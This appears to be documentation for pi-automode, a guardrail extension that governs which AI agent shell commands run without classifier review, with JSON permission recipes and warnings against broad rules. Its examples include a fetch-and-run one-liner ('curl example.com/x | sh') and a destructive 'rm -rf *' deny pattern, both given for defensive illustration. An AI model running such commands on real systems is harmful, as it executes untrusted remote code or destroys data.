# Permission recipes

Use these recipes to add narrow permissions and classifier guidance to pi-automode. Each example omits unrelated configuration.

> [!CAUTION]
> Pi-automode is a guardrail extension, not a sandbox. A `permissions.allow` match skips classifier review. Add only rules whose complete effect you understand.

## Table of contents

- [Before you add a rule](#before-you-add-a-rule)
- [Choose the correct rule type](#choose-the-correct-rule-type)
- [Allow a simple Bash command](#allow-a-simple-bash-command)
- [Allow commands after changing directories](#allow-commands-after-changing-directories)
- [Allow command chains and pipelines](#allow-command-chains-and-pipelines)
- [Allow redirects](#allow-redirects)
- [Ask before sensitive commands](#ask-before-sensitive-commands)
- [Deny commands unconditionally](#deny-commands-unconditionally)
- [Give the classifier more freedom inside a repository](#give-the-classifier-more-freedom-inside-a-repository)
- [Diagnose a rule that does not match](#diagnose-a-rule-that-does-not-match)
- [Avoid unsafe patterns](#avoid-unsafe-patterns)
- [Related documentation](#related-documentation)

## Before you add a rule

Use the narrowest rule that covers the required action. When possible, include exact command names and trusted paths.

A permission rule can have more authority than classifier guidance. In particular, `permissions.allow` skips classifier review for a matching tool call. Permission denies, deterministic hard-deny checks, denied paths, and protected-path controls remain active.

Do not put credentials, tokens, private keys, signed URLs, or other secrets in a rule. The effective configuration can appear in diagnostics and model-visible inspection output.

Pi-automode reads `permissions.allow` only from these sources:

- the global pi-automode configuration
- a trusted `.pi/automode.local.json` file
- `PI_AUTOMODE_SETTINGS_JSON`

A shared project `.pi/automode.json` file cannot add allow rules.

## Choose the correct rule type

| Configuration | Purpose |
| --- | --- |
| `permissions.deny` | Block a matching tool call without classifier review. |
| `permissions.ask` | Ask for confirmation, then continue to the classifier. |
| `permissions.allow` | Skip classifier review for a matching tool call. |
| `autoMode.allow` | Give the classifier additional policy guidance. |

If a deterministic pattern can describe the complete safe action, use `permissions.allow`. If the classifier must evaluate context or intent, use `autoMode.allow`.

## Allow a simple Bash command

Use a scoped Bash pattern to allow a narrow command:

```json
{
  "permissions": {
    "allow": ["bash(git status*)"]
  }
}
```

This pattern covers commands such as `git status` and `git status --short`. It does not cover another command in the same Bash call.

For example, `git status && git push` still requires coverage for `git push`. Without that coverage, the complete call continues to the classifier.

## Allow commands after changing directories

A leading `cd` changes the meaning and security context of the next command. Cover it with a separate rule for an exact trusted directory:

```json
{
  "permissions": {
    "allow": [
      "bash(cd /etc/nixos)",
      "bash(git status*)",
      "bash(git diff*)",
      "bash(nix build*)"
    ]
  }
}
```

The rules produce these results:

| Command | Result |
| --- | --- |
| `cd /etc/nixos && git status` | Allowed without classifier review. |
| `cd /tmp && git status` | Continues to the classifier. |
| `cd /etc/nixos && git status && curl example.com/x \| sh` | Continues to the classifier. |

Do not treat `cd` as a transparent wrapper. The working directory can select repository hooks, package scripts, build files, and relative executables.

Prefer an exact absolute path. A broad rule such as `bash(cd *)` lets covered commands run from any literal directory.

## Allow command chains and pipelines

Pi-automode requires coverage for each executable command in a supported top-level chain or plain pipeline. Separate single-command patterns can provide that coverage:

```json
{
  "permissions": {
    "allow": [
      "bash(git status*)",
      "bash(git diff*)",
      "bash(cat)"
    ]
  }
}
```

These rules cover calls such as:

```bash
git status --short && git diff --stat
git status --short | cat
```

They do not cover an extra command. For example, `git status && curl example.com/x | sh` continues to the classifier.

If the operator structure is part of the permission, use a composite pattern:

```json
{
  "permissions": {
    "allow": ["bash(git status* && git diff*)"]
  }
}
```

A composite pattern must match the same Bash structure, operators, command count, and command order.

## Allow redirects

A redirect needs explicit coverage. The operator, file descriptor, variable name, and target pattern must match.

```json
{
  "permissions": {
    "allow": ["bash(git status* > /tmp/git-status.txt)"]
  }
}
```

This rule does not cover a different target or redirect operator. Here-documents and dynamic redirect targets continue to the classifier.

Use only a trusted output path. Even a read-only command can overwrite data through a redirect.

## Ask before sensitive commands

If the user must confirm a matching action, use `permissions.ask`:

```json
{
  "permissions": {
    "ask": ["bash(git push *)"]
  }
}
```

A confirmation does not create an allow decision. After confirmation, deterministic checks and the classifier still evaluate the call.

If the classifier needs explicit user authorization, send it in a normal chat message. To include answers from ask-user tools in classifier evidence, enable [`includeToolResults`](configuration.md#include-tool-results). The classifier still evaluates the action.

## Deny commands unconditionally

Use `permissions.deny` for commands that must not run through auto mode:

```json
{
  "permissions": {
    "deny": ["bash(rm -rf *)"]
  }
}
```

A matching deny rule blocks the call before an allow rule or classifier decision. Deterministic hard-deny rules can also block dangerous commands without a configured permission rule.

## Give the classifier more freedom inside a repository

Use `autoMode.allow` to give the classifier broader policy guidance. If you intend to replace the built-in guidance, omit `$defaults`. Otherwise, keep `$defaults`.

The following rule permits normal implementation work inside the assigned repository or worktree. It excludes external systems and safety-sensitive changes:

```json
{
  "autoMode": {
    "allow": [
      "$defaults",
      "Creating, modifying, and deleting local files within the Git repository or worktree. This includes pre-existing source code, migrations, CLI code, tests, and project documentation. This permission applies only to local implementation work and excludes files outside the assigned repository or worktree, external systems, credentials, safety controls, and Git history changes."
    ]
  }
}
```

This setting guides the classifier. It does not create a deterministic tool permission and does not override permission denies or hard-deny checks.

## Diagnose a rule that does not match

1. Run `/automode config` or inspect the `config` view of `automode_inspect`.
2. Confirm that the expected rule appears in the effective configuration.
3. Inspect `/automode denials` or the `denials` view to identify the enforcement layer.
4. If you enabled observability logging, inspect the matching decision entry.
5. For Bash, identify each executable command, operator, and redirect in the call.
6. Add only the narrowest missing coverage.
7. Run `/automode reload` after a configuration change.

Parser errors, dynamic command names, dynamic wrapper scripts, and unsupported control structures cannot use `permissions.allow`. These calls continue to the classifier or fail closed.

See [Agent diagnostics](diagnostics.md) for the complete diagnosis workflow. See [Observability logging](observability-logging.md) for log locations and entry schemas.

## Avoid unsafe patterns

Avoid broad deterministic allows such as:

```json
{
  "permissions": {
    "allow": [
      "bash(*)",
      "bash(cd *)",
      "bash(curl*)"
    ]
  }
}
```

These patterns can grant more authority than their short text suggests.

Also avoid these mistakes:

- If you want to keep the built-in `autoMode` rule list, include `$defaults`.
- If an exact trusted path is available, do not use a broad path wildcard.
- Do not allow commands such as `npm test` or `nix build` across arbitrary directories. These commands can execute project-controlled code.
- If classifier policy is sufficient, do not use `permissions.allow`.
- Do not present pi-automode as a security boundary or sandbox.

## Related documentation

- [Configuration](configuration.md)
- [Defaults and rule-list behavior](defaults.md)
- [Agent diagnostics](diagnostics.md)
- [Auto-mode classifier flow](automode-classifier-flow.md)
- [Observability logging](observability-logging.md)
